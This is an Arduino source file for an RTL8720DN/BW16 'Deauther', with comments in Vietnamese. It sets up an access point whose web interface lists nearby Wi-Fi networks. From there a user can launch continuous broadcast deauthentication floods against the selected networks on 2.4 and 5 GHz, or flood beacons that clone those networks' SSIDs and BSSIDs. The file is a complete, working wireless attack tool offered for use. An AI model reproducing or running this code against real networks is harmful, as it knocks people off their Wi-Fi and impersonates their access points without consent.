#include <Arduino.h>
#include <WiFi.h>
#include <WiFiServer.h>
#include <WiFiClient.h>
#include <vector>
#include <map>
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"

// Bao gồm FreeRTOS (nếu SDK BW16 đã tích hợp FreeRTOS)
#include <FreeRTOS.h>
#include <task.h>
#include <semphr.h>

// Nếu LED đã được định nghĩa trong variant thì không định nghĩa lại
#ifndef LED_R
  #define LED_R 2
#endif
#ifndef LED_G
  #define LED_G 3
#endif
#ifndef LED_B
  #define LED_B 4
#endif

// --------------------------------------------------
// Các trạng thái của mạch
enum DeviceState {
  STATE_IDLE,     // Idle: Không hoạt động – LED sẽ tắt nếu không có client
  STATE_SCANNING, // Đang quét mạng
  STATE_ATTACK,   // Đang tấn công deauth
  STATE_BEACON    // Đang phát Beacon (nhái)
};

volatile DeviceState currentState = STATE_IDLE;  // volatile vì được truy cập từ nhiều task

// Biến để theo dõi trạng thái kết nối của client trên WebServer
volatile bool clientConnected = false;

// Các hằng số LED pattern (millisecond)
const unsigned long BLINK_INTERVAL_ATTACK  = 1000;
const unsigned long BLINK_INTERVAL_SCANNING = 500;
const unsigned long BLINK_INTERVAL_BEACON   = 1000;

// --------------------------------------------------
// Cấu trúc lưu trữ kết quả quét WiFi
struct WiFiScanResult {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
};

// Thông tin AP cho chế độ Access Point
const char *ssid_ap = "BW16";
const char *pass_ap = "deauther";

// Kênh mặc định (có thể thay đổi theo môi trường)
int current_channel = 12;

// Danh sách kết quả quét
std::vector<WiFiScanResult> scan_results;

// Các vector lưu các mục tiêu tấn công (dùng cho deauth)
std::vector<int> attack_targets_24;  // cho 2.4GHz (channel < 36)
std::vector<int> attack_targets_5;   // cho 5GHz (channel >= 36)

// Các vector lưu các mục tiêu beacon (dùng để “nhái” beacon)
std::vector<int> beacon_targets_24;  // cho 2.4GHz
std::vector<int> beacon_targets_5;   // cho 5GHz

// Địa chỉ BSSID tạm thời để gửi frame (cho deauth)
uint8_t deauth_bssid[6];

// Reason code mặc định cho deauth
const uint16_t DEFAULT_DEAUTH_REASON = 2;
uint16_t deauth_reason = DEFAULT_DEAUTH_REASON;

// --------------------------------------------------
// Số frame gửi mỗi chu kỳ cho từng băng
#define FRAMES_PER_DEAUTH_24 5    // số frame deauth gửi cho băng 2.4GHz
#define FRAMES_PER_DEAUTH_5  10   // số frame deauth gửi cho băng 5GHz
#define FRAMES_PER_BEACON    200  // số frame beacon gửi mỗi lần

// --------------------------------------------------
// Các khoảng thời gian riêng cho tấn công từng băng (ms)
// Dựa vào giả định:
// - 2.4GHz: 5 frame * 5ms = 25ms + overhead ~10ms → khoảng 35ms (đặt interval = 40ms để có dư)
// - 5GHz: 10 frame * 5ms = 50ms + overhead ~40ms → khoảng 90ms (đặt interval = 90ms)
const unsigned long ATTACK_INTERVAL_24 = 40;
const unsigned long ATTACK_INTERVAL_5  = 90;
unsigned long lastAttackTime24 = 0;
unsigned long lastAttackTime5  = 0;
static int currentTargetIndex24 = 0;
static int currentTargetIndex5  = 0;

// Các biến chỉ số cho beacon (các mục được “nhái”)
static int currentBeaconIndex24 = 0;
static int currentBeaconIndex5  = 0;

// --------------------------------------------------
// Mutex để đồng bộ chuyển kênh
SemaphoreHandle_t channelMutex = NULL;

// --------------------------------------------------
// Hàm cập nhật LED theo trạng thái (non‑blocking)
// Ở đây, trong chế độ STATE_IDLE, LED sẽ chỉ sáng nếu có client kết nối (clientConnected == true)
void updateLEDs() {
  static unsigned long lastToggleTime = 0;
  static bool ledState = false;
  unsigned long now = millis();
  
  // Tắt toàn bộ LED trước khi cập nhật
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);
  
  if (currentState == STATE_IDLE) {
    // Ở idle, LED không sáng nếu không có client kết nối; nếu có, bật LED_R
    if (clientConnected)
      digitalWrite(LED_R, HIGH);
    else
      digitalWrite(LED_R, LOW);
  }
  else if (currentState == STATE_SCANNING) {
    if (now - lastToggleTime >= BLINK_INTERVAL_SCANNING) {
      ledState = !ledState;
      lastToggleTime = now;
    }
    digitalWrite(LED_B, ledState ? HIGH : LOW);
  }
  else if (currentState == STATE_ATTACK) {
    if (now - lastToggleTime >= BLINK_INTERVAL_ATTACK) {
      ledState = !ledState;
      lastToggleTime = now;
    }
    digitalWrite(LED_G, ledState ? HIGH : LOW);
  }
  else if (currentState == STATE_BEACON) {
    if (now - lastToggleTime >= BLINK_INTERVAL_BEACON) {
      ledState = !ledState;
      lastToggleTime = now;
    }
    digitalWrite(LED_R, ledState ? HIGH : LOW);
  }
}

// --------------------------------------------------
// Hàm callback xử lý kết quả quét WiFi
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(result.bssid, &record->BSSID, 6);
    char bssid_str[18] = {0};
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             result.bssid[0], result.bssid[1], result.bssid[2],
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = String(bssid_str);
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

// --------------------------------------------------
// Hàm quét các mạng WiFi (khoảng 5 giây)
int scanNetworks() {
  currentState = STATE_SCANNING;
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...\n");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    vTaskDelay(pdMS_TO_TICKS(5000));
    DEBUG_SER_PRINT("Scan done!\n");
    currentState = STATE_IDLE;
    return 0;
  } else {
    DEBUG_SER_PRINT("Scan failed!\n");
    currentState = STATE_IDLE;
    return 1;
  }
}

// --------------------------------------------------
// Parse HTTP request: trả về URL (đã trim khoảng trắng)
String parseRequest(String request) {
  if (request.length() == 0) return "";
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  String path = request.substring(path_start, path_end);
  path.trim();
  return path;
}

// Phân tích dữ liệu POST thành các cặp key-value (không decode URL)
std::vector<std::pair<String, String>> parsePost(String &request) {
    std::vector<std::pair<String, String>> post_params;
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) return post_params;
    body_start += 4;
    String post_data = request.substring(body_start);
    int start = 0;
    int end = post_data.indexOf('&', start);
    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');
        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params.push_back({key, value});
        }
        start = end + 1;
        end = post_data.indexOf('&', start);
    }
    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = key_value_pair.substring(0, delimiter_position);
        String value = key_value_pair.substring(delimiter_position + 1);
        post_params.push_back({key, value});
    }
    return post_params;
}

// --------------------------------------------------
// Tạo phản hồi HTTP (header)
String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\r\n";
  response += "Content-Type: " + content_type + "\r\n";
  response += "Connection: close\r\n\r\n";
  return response;
}

// --------------------------------------------------
// Giao diện Web (HTML)
void handleRoot(WiFiClient &client) {
  String response = makeResponse(200, "text/html") +
  R"(
  <!DOCTYPE html>
  <html lang="vi">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RTL8720DN Deauther</title>
    <style>
      * { box-sizing: border-box; margin: 0; padding: 0; }
      body { font-family: Arial, Helvetica, sans-serif; background: #f2f4f8; color: #333; line-height: 1.4; padding: 5px; font-size: 14px; }
      .container { max-width: 960px; margin: 10px auto; background: #fff; border-radius: 8px; box-shadow: 0 3px 8px rgba(0,0,0,0.1); overflow: hidden; }
      header { background: #2980b9; color: #fff; padding: 10px; text-align: center; }
      header h1 { font-size: 1.4em; }
      main { padding: 10px; }
      table { width: 100%; border-collapse: collapse; margin-bottom: 10px; }
      thead { background: #3498db; color: #fff; }
      th, td { padding: 6px 4px; text-align: center; border-bottom: 1px solid #ddd; font-size: 0.8em; }
      tbody tr:nth-child(even) { background: #f9fafc; }
      .btn { display: block; width: 100%; border: none; border-radius: 4px; padding: 8px; margin-bottom: 8px; font-size: 0.9em; cursor: pointer; transition: background 0.3s ease; }
      .btn-launch { background: #27ae60; color: #fff; }
      .btn-launch:hover { background: #219150; }
      .btn-rescan { background: #3498db; color: #fff; }
      .btn-rescan:hover { background: #2980b9; }
      .btn-stop { background: #e74c3c; color: #fff; }
      .btn-stop:hover { background: #cf3e33; }
      @media (max-width: 600px) {
        header h1 { font-size: 1.2em; }
        th, td { padding: 4px; font-size: 0.75em; }
        .btn { padding: 6px; font-size: 0.8em; }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <header>
        <h1>RTL8720DN Deauther</h1>
      </header>
      <main>
        <form method="post" action="/action">
          <table>
            <thead>
              <tr>
                <th>Select</th>
                <th>SSID</th>
                <th>BSSID</th>
                <th>Channel</th>
                <th>RSSI</th>
                <th>Freq</th>
              </tr>
            </thead>
            <tbody>
  )";
  for (uint32_t i = 0; i < scan_results.size(); i++) {
    response += "<tr>";
    response += "<td><input type='checkbox' name='network' value='" + String(i) + "'></td>";
    response += "<td>" + scan_results[i].ssid + "</td>";
    response += "<td>" + scan_results[i].bssid_str + "</td>";
    response += "<td>" + String(scan_results[i].channel) + "</td>";
    response += "<td>" + String(scan_results[i].rssi) + "</td>";
    response += "<td>" + String((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td>";
    response += "</tr>";
  }
  response += R"(
            </tbody>
          </table>
          <button type='submit' name='action' value='deauth' class='btn btn-launch'>Launch Deauth</button>
          <button type='submit' name='action' value='beacon' class='btn btn-launch'>Launch Beacon</button>
        </form>
        <form method='post' action='/rescan'>
          <button type='submit' class='btn btn-rescan'>Rescan Networks</button>
        </form>
  )";
  if (currentState == STATE_ATTACK || currentState == STATE_BEACON) {
    response += R"(
      <form method='post' action='/stop'>
        <button type='submit' class='btn btn-stop'>Stop Attack/Beacon</button>
      </form>
    )";
  }
  response += R"(
      </main>
    </div>
  </body>
  </html>
  )";
  client.write(response.c_str());
}

// --------------------------------------------------
// Hàm xử lý trang 404
void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain") + "Not found!";
  client.write(response.c_str());
}

// --------------------------------------------------
// Đối tượng WiFiServer toàn cục (port 80)
WiFiServer server(80);

// --------------------------------------------------
// Task: Cập nhật LED (non‑blocking)
// Trong chế độ STATE_IDLE, LED_R chỉ sáng khi có client kết nối (clientConnected == true)
void LEDUpdateTask(void *pvParameters) {
  (void) pvParameters;
  while (1) {
    updateLEDs();
    vTaskDelay(pdMS_TO_TICKS(50));
  }
}

// --------------------------------------------------
// Task: Web Server – lắng nghe và xử lý HTTP request
void WebServerTask(void *pvParameters) {
  (void) pvParameters;
  server.begin();
  while (1) {
    WiFiClient client = server.available();
    if (client && client.connected()) {
      // Khi có client kết nối, đánh dấu trạng thái kết nối
      clientConnected = true;
      String request;
      while (client.available()) {
        request += (char)client.read();
        vTaskDelay(pdMS_TO_TICKS(1));
      }
      if (request.length() == 0 || request.indexOf("favicon.ico") >= 0) {
        client.stop();
        clientConnected = false;
      } else {
        DEBUG_SER_PRINT("Request: " + request + "\n");
        String path = parseRequest(request);
        DEBUG_SER_PRINT("Path: " + path + "\n");
        if (path == "/" || path == "/index.html") {
          handleRoot(client);
        } else if (path == "/rescan") {
          scanNetworks();
          handleRoot(client);
        } else if (path == "/action") {
          std::vector<std::pair<String, String>> post_data = parsePost(request);
          String action = "";
          for (auto &param : post_data) {
            if (param.first == "action") {
              action = param.second;
              break;
            }
          }
          if (action == "deauth") {
            attack_targets_24.clear();
            attack_targets_5.clear();
            for (auto &param : post_data) {
              if (param.first == "network") {
                int idx = param.second.toInt();
                if (idx >= 0 && idx < (int)scan_results.size()) {
                  uint8_t ch = scan_results[idx].channel;
                  if (ch >= 36)
                    attack_targets_5.push_back(idx);
                  else
                    attack_targets_24.push_back(idx);
                  DEBUG_SER_PRINT("Deauth target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
                }
              }
            }
            if (!attack_targets_24.empty() || !attack_targets_5.empty()) {
              currentState = STATE_ATTACK;
              currentTargetIndex24 = 0;
              currentTargetIndex5 = 0;
              lastAttackTime24 = millis();
              lastAttackTime5  = millis();
            }
          } else if (action == "beacon") {
            beacon_targets_24.clear();
            beacon_targets_5.clear();
            for (auto &param : post_data) {
              if (param.first == "network") {
                int idx = param.second.toInt();
                if (idx >= 0 && idx < (int)scan_results.size()) {
                  uint8_t ch = scan_results[idx].channel;
                  if (ch >= 36)
                    beacon_targets_5.push_back(idx);
                  else
                    beacon_targets_24.push_back(idx);
                  DEBUG_SER_PRINT("Beacon target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
                }
              }
            }
            if (!beacon_targets_24.empty() || !beacon_targets_5.empty()) {
              currentState = STATE_BEACON;
              currentBeaconIndex24 = 0;
              currentBeaconIndex5 = 0;
            }
          }
          handleRoot(client);
        } else if (path == "/stop") {
          currentState = STATE_IDLE;
          attack_targets_24.clear();
          attack_targets_5.clear();
          beacon_targets_24.clear();
          beacon_targets_5.clear();
          handleRoot(client);
        } else {
          handle404(client);
        }
        client.stop();
        // Sau khi xử lý xong, đánh dấu không có client kết nối nữa
        clientConnected = false;
      }
    } else {
      // Không có client kết nối
      clientConnected = false;
    }
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}

// --------------------------------------------------
// Task: Thực hiện tấn công deauth cho cả 2 băng
void AttackTask(void *pvParameters) {
  (void) pvParameters;
  while (1) {
    if (currentState == STATE_ATTACK) {
      unsigned long now = millis();
      
      // Xử lý cho băng 2.4GHz
      if (!attack_targets_24.empty() && (now - lastAttackTime24 >= ATTACK_INTERVAL_24)) {
        int idx = attack_targets_24[currentTargetIndex24];
        if (idx >= 0 && idx < (int)scan_results.size()) {
          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
          memcpy(deauth_bssid, scan_results[idx].bssid, 6);
          for (int j = 0; j < FRAMES_PER_DEAUTH_24; j++) {
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            vTaskDelay(pdMS_TO_TICKS(5));
          }
          DEBUG_SER_PRINT("Attacked 2.4GHz target idx: " + String(idx) + "\n");
        }
        currentTargetIndex24 = (currentTargetIndex24 + 1) % attack_targets_24.size();
        lastAttackTime24 = now;
      }
      
      // Xử lý cho băng 5GHz
      if (!attack_targets_5.empty() && (now - lastAttackTime5 >= ATTACK_INTERVAL_5)) {
        int idx = attack_targets_5[currentTargetIndex5];
        if (idx >= 0 && idx < (int)scan_results.size()) {
          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
          memcpy(deauth_bssid, scan_results[idx].bssid, 6);
          for (int j = 0; j < FRAMES_PER_DEAUTH_5; j++) {
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            vTaskDelay(pdMS_TO_TICKS(5));
          }
          DEBUG_SER_PRINT("Attacked 5GHz target idx: " + String(idx) + "\n");
        }
        currentTargetIndex5 = (currentTargetIndex5 + 1) % attack_targets_5.size();
        lastAttackTime5 = now;
      }
    }
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}

// --------------------------------------------------
// Task: Thực hiện phát Beacon cho cả 2 băng
void BeaconTask(void *pvParameters) {
  (void) pvParameters;
  uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  while (1) {
    if (currentState == STATE_BEACON) {
      // Xử lý cho băng 2.4GHz
      if (!beacon_targets_24.empty()) {
        int idx = beacon_targets_24[currentBeaconIndex24];
        if (idx >= 0 && idx < (int)scan_results.size()) {
          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
          for (int j = 0; j < FRAMES_PER_BEACON; j++) {
            wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
            vTaskDelay(pdMS_TO_TICKS(5));
          }
          DEBUG_SER_PRINT("Beacon sent for 2.4GHz target idx: " + String(idx) + "\n");
        }
        currentBeaconIndex24 = (currentBeaconIndex24 + 1) % beacon_targets_24.size();
      }
      // Xử lý cho băng 5GHz
      if (!beacon_targets_5.empty()) {
        int idx = beacon_targets_5[currentBeaconIndex5];
        if (idx >= 0 && idx < (int)scan_results.size()) {
          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
          for (int j = 0; j < FRAMES_PER_BEACON; j++) {
            wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
            vTaskDelay(pdMS_TO_TICKS(5));
          }
          DEBUG_SER_PRINT("Beacon sent for 5GHz target idx: " + String(idx) + "\n");
        }
        currentBeaconIndex5 = (currentBeaconIndex5 + 1) % beacon_targets_5.size();
      }
    }
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}

// --------------------------------------------------
// setup(): Khởi tạo WiFi AP, quét mạng ban đầu và tạo các task FreeRTOS
void setup() {
  // Cấu hình chân LED
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();

  char channelStr[4];
  snprintf(channelStr, sizeof(channelStr), "%d", current_channel);
  WiFi.apbegin((char*)ssid_ap, (char*)pass_ap, channelStr);

  // Quét mạng ban đầu
  scanNetworks();

  currentState = STATE_IDLE;
  // Trong idle, LED không sáng (LED_R OFF) cho đến khi có client kết nối

  // Tạo mutex cho chuyển kênh
  channelMutex = xSemaphoreCreateMutex();

  // Tạo các task FreeRTOS
  xTaskCreate(LEDUpdateTask, "LEDUpdate", 1024, NULL, 1, NULL);
  xTaskCreate(WebServerTask, "WebServer", 4096, NULL, 1, NULL);
  xTaskCreate(AttackTask, "Attack", 2048, NULL, 2, NULL);
  xTaskCreate(BeaconTask, "Beacon", 2048, NULL, 2, NULL);
}

// --------------------------------------------------
// loop(): Không cần xử lý HTTP vì đã được WebServerTask đảm nhiệm.
void loop() {
  updateLEDs();
  // Các tác vụ nền khác có thể được thực hiện ở đây nếu cần.
}
